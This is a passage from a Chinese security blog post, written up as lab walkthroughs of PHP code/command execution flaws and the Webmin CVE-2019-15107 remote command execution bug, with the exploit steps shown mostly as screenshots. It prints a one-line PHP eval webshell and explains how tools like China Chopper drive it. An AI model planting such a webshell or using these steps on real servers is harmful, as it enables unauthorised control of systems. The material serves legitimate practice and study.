src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image14.png" alt="image14"></p><h3 id="2-进入靶场"><a href="#2-进入靶场" class="headerlink" title="2.进入靶场"></a>2.进入靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image15.png" alt="image15"></p><p>将获取到的脚本放到php环境中运行，运行之前对脚本进行修改：</p><ul><li>去掉base64解码前后的&amp;&amp;（因为base64加密末尾为== ）</li><li>base64解码数据加上’’</li></ul><h3 id="3-输出结果"><a href="#3-输出结果" class="headerlink" title="3.输出结果"></a>3.输出结果</h3><p>这串代码的运行结果为输出：<code>echo $_REQUEST[a];; ?&gt;</code>，其中request为接受的参数 。</p><p>这句代码等同于<code>eval(&#39;$_REQUEST[a]&#39;;;?&gt;)</code></p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image16.png" alt="image16"></p><h3 id="4-传递参数"><a href="#4-传递参数" class="headerlink" title="4.传递参数"></a>4.传递参数</h3><p>在发送查看（ls）命令之前可以查看数据包来查看OS版本，查看得知为linux，因此查看命令为ls.</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image17.png" alt="image17"></p><h3 id="5-读取文件"><a href="#5-读取文件" class="headerlink" title="5.读取文件"></a>5.读取文件</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image18.png" alt="image18"></p><p><strong>注意：这里明明是代码执行，但是却可以执行系统命令（一般来说eval是代码执行，system是命令执行）</strong></p><h3 id="6-代码执行转命令执行探究"><a href="#6-代码执行转命令执行探究" class="headerlink" title="6.代码执行转命令执行探究"></a>6.代码执行转命令执行探究</h3><p>``是linux里面的符号，用来执行里面的指令。</p><p>猜测应该是`参数`;;?&gt;将代码执行转为了命令执行。</p><h2 id="七-墨者靶场黑盒层-RCE-漏洞检测"><a href="#七-墨者靶场黑盒层-RCE-漏洞检测" class="headerlink" title="七.墨者靶场黑盒层 RCE 漏洞检测"></a>七.墨者靶场黑盒层 RCE 漏洞检测</h2><h3 id="1-靶场地址-2"><a href="#1-靶场地址-2" class="headerlink" title="1.靶场地址"></a>1.靶场地址</h3><p><strong>Webmin 远程命令执行漏洞(CVE-2019-15107)</strong></p><p>影响版本：1.882-1.920</p><p>条件：1.890版本，漏洞点的触发只需要在修改密码处传一个expired参数执行命令即可。不需要passwd_mode=2的必要条件。除1.890版本，其余受影响的版本的服务器的配置文件需passwd_mode=2的条件。无需用户名密码，可执行任意命令。</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image19.png" alt="image19"></p><h3 id="2-进入靶场-1"><a href="#2-进入靶场-1" class="headerlink" title="2.进入靶场"></a>2.进入靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image20.png" alt="image20"></p><p>随便输入账号密码，并抓包</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image21.png" alt="image21"></p><p>修改数据包后发送</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image22.png" alt="image22"></p><p>更换命令pwd</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image23.png" alt="image23"></p><p>没找到相关文件，直接查看更目录</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image24.png" alt="image24"></p><p>查看key.txt，找到flag</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image25.png" alt="image25"></p><h2 id="八-相关概念"><a href="#八-相关概念" class="headerlink" title="八.相关概念"></a>八.相关概念</h2><p><strong>EXP：利用漏洞</strong></p><p><strong>POC：验证漏洞</strong></p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image26.png" alt="image26"></p><h2 id="九-关于一句话后门"><a href="#九-关于一句话后门" class="headerlink" title="九.关于一句话后门"></a>九.关于一句话后门</h2><p>例如一句话代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li>菜刀、蚁剑等工具将功能性函数写入程序里面；</li><li>然后网站访问后门地址，将接受post传递的参数，并且将传递的参数当做系统命令执行；</li><li>菜刀将操作系统的命令写入参数，以post方式传递给网站后门，网站后门通过eval（）代码执行来执行系统命令或者代码，从而达到了菜刀远程操作服务器的目的。</li></ol></div><footer class="post-footer"><div class="post-eof"></div></footer></article><nav class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a></nav></div><script>window.addEventListener("tabs:register",()=>{let e=CONFIG.comments["activeClass"];if(CONFIG.comments.storage&&(e=localStorage.getItem("comments_active")||e),e){let t=document.querySelector(`a[href="#comment-${e}"]`);t&&t.click()}}),CONFIG.comments.storage&&window.addEventListener("tabs:click",t=>{t.target.matches(".tabs-comment .tab-content .tab-pane")&&(t=t.target.classList[1],localStorage.setItem("comments_active",t))})</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="zym" src="/images/Panda.jpg"><p class="site-author-name" itemprop="name">zym</p><div class="site-description" itemprop="description">生活日常随笔</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">48</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">6</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">17</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/zym1290190720" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zym1290190720" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a> </span><span class="links-of-author-item"><a href="https://space.bilibili.com/102399257" title="哔哩哔哩 → https:&#x2F;&#x2F;space.bilibili.com&#x2F;102399257" rel="noopener" target="_blank"><i class="fa fa-bilibili fa-fw"></i>哔哩哔哩</a> </span><span class="links-of-author-item"><a href="/1290190720@qq.com" title="E-Mail → 1290190720@qq.com"><i class="fa fa-email fa-fw"></i>E-Mail</a></span></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=7031295547&auto=1&height=430"></iframe></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">zym</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-chart-area"></i> </span><span class="post-meta-item-text">站点总字数：</span> <span title="站点总字数">146k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span class="post-meta-item-text">站点阅读时长 &asymp;</span> <span title="站点阅读时长">2:12</span></div><span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span><script>var now=new Date;function createtime(){var n=new Date("10/20/2021 17:38:00");now.setTime(now.getTime()+250),days=(now-n)/1e3/60/60/24,dnum=Math.floor(days),hours=(now-n)/1e3/60/60-24*dnum,hnum=Math.floor(hours),1==String(hnum).length&&(hnum="0"+hnum),minutes=(now-n)/1e3/60-1440*dnum-60*hnum,mnum=Math.floor(minutes),1==String(mnum).length&&(mnum="0"+mnum),seconds=(now-n)/1e3-86400*dnum-3600*hnum-60*mnum,snum=Math.round(seconds),1==String(snum).length&&(snum="0"+snum),document.getElementById("timeDate").innerHTML="本站已运行 "+dnum+" 天 ",document.getElementById("times").innerHTML=hnum+" 小时 "+mnum+" 分 "+snum+" 秒"}setInterval("createtime()",250)</script><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-divider">|</span> <span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div></div></footer></div><script color="" opacity="" zindex="" count="" src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script><script src="/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script>!function(){var e,t,o,n,r=document.getElementsByTagName("link");if(0<r.length)for(i=0;i<r.length;i++)"canonical"==r[i].rel.toLowerCase()&&r[i].href&&(e=r[i].href);t=(e||window.location.protocol).split(":")[0],e=e||window.location.href,window,o=e,n=document.referrer,/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi.test(o)||(t="https"===String(t).toLowerCase()?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif",n?(t+="?r="+encodeURIComponent(document.referrer),o&&(t+="&l="+o)):o&&(t+="?l="+o),(new Image).src=t)}()</script><script src="/js/local-search.js"></script><script>NexT.utils.loadComments(document.querySelector("#valine-comments"),()=>{NexT.utils.getScript("//unpkg.com/valine/dist/Valine.min.js",()=>{var i=["nick","mail","link"],e="nick,mail,link".split(",").filter(e=>i.includes(e));new Valine({el:"#valine-comments",verify:!1,notify:!1,appId:"7p2LmPjyfCosM5SP4z3ebEAM-gzGzoHsz",appKey:"eeaup3Y0KIEkbiXMdTna4Hgy",placeholder:"留下你的足迹吧",avatar:"mm",meta:e,pageSize:"10",visitor:!1,lang:"zh-cn",path:location.pathname,recordIP:!1,serverURLs:""})},window.Valine)})</script><！ - 页面点击小红心 - ><script type="text/javascript" src="/js/love-click.js"></script></body></html>